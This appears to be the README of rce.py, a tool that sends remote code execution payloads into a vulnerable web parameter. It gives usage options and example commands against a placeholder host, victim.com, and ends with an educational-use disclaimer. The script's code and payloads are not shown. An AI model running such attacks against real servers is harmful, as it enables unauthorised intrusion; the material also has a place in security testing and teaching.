# RCE : Remote Code Execution

Usage:
------
  ./rce.py [options] ur<rce>l
  
  
Options:
--------
  -p     - Use POST method instead of GET. Enter url as GET.
  -u     - Overload user agent.
  -i <r> - Use regex for the output.
  -r <f> - Upload the file.
  -h     - Help. This menu.
  <rce>  - Location of vulnerable parameter.   
  
  
Example:
--------
  ./rce.py 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Sends the attack as a GET request, replacing '<rce>' with the payload.
        
        
  ./rce.py -u 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Sends the attack as a GET request, replacing '<rce>' with the payload and overwrite the user agent.
        
        
  ./rce.py -p 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Parses the parameters from the url and sends the attack as a POST request, replacing '<rce>' with the payl
oad.


  ./rce.py -i '<toto>(.*)</toto>' 'http://victim.com/query?vulnparam=<rce>&safeparam=value'
        - Display only the result between the balises 'toto'.
        
        
Disclaimer :
------------
This provided script is to be used for educational purposes only. The creator is in no way responsible for any misuse of 
the information provided. All of the information is meant to help the reader develop a hacker defense attitude in order to
prevent the attacks discussed. In no way should you use this script to cause any kind of damage directly or indirectly.
